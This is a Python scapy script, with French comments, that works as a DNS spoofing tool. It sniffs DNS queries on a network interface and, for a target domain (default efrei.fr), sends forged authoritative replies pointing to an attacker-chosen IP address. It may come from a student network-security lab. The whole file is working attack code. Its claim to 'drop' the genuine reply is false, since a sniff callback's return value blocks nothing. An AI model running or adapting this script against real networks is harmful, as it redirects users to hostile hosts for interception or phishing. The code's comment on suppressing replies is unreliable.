from scapy.all import *

def dns_filter_and_spoof(packet, spoofed_ip="139.10.20.3", target_domain="efrei.fr"):
    """
    Filtre les requêtes DNS pour `target_domain`, injecte une réponse malveillante, 
    et supprime le paquet DNS légitime.
    """
    if packet.haslayer(DNS) and packet.getlayer(DNS).qd is not None:
        queried_domain = packet['DNS'].qd.qname.decode().strip(".")
        
        if queried_domain == target_domain:
            print(f"[ALERT] Requête DNS interceptée pour {queried_domain}")

            # Construire une réponse DNS malveillante
            spoofed_response = (
                Ether(src=packet['Ether'].dst, dst=packet['Ether'].src) /
                IP(src=packet['IP'].dst, dst=packet['IP'].src) /
                UDP(sport=packet['UDP'].dport, dport=packet[UDP].sport) /
                DNS(
                    id=packet['DNS'].id,
                    qr=1,  # Réponse (query = 0, response = 1)
                    aa=1,  # Réponse autoritative
                    qd=packet['DNS'].qd,
                    an=DNSRR(rrname=packet['DNS'].qd.qname, ttl=10, rdata=spoofed_ip)
                )
            )
            
            # Envoyer la réponse malveillante
            sendp(spoofed_response, verbose=False)
            print(f"[INFO] Réponse DNS spoofée envoyée : {spoofed_ip} pour {queried_domain}")
            
            # Supprimer le paquet en empêchant sa propagation
            return "DROP"
    return None

def main():
    import argparse
    parser = argparse.ArgumentParser(description="DNS Filter and Spoof Script")
    parser.add_argument("--iface", required=True, help="Interface réseau à utiliser")
    parser.add_argument("--target-domain", default="efrei.fr", help="Nom de domaine à spoof")
    parser.add_argument("--spoofed-ip", default="13.37.13.37", help="IP spoofée pour le domaine")
    args = parser.parse_args()

    iface = args.iface
    target_domain = args.target_domain
    spoofed_ip = args.spoofed_ip

    print("[INFO] Sniffing en cours sur l'interface", iface)
    sniff(
        filter="udp port 53",
        iface=iface,
        prn=lambda x: dns_filter_and_spoof(x, spoofed_ip, target_domain),
        store=False
    )

if __name__ == "__main__":
    main()

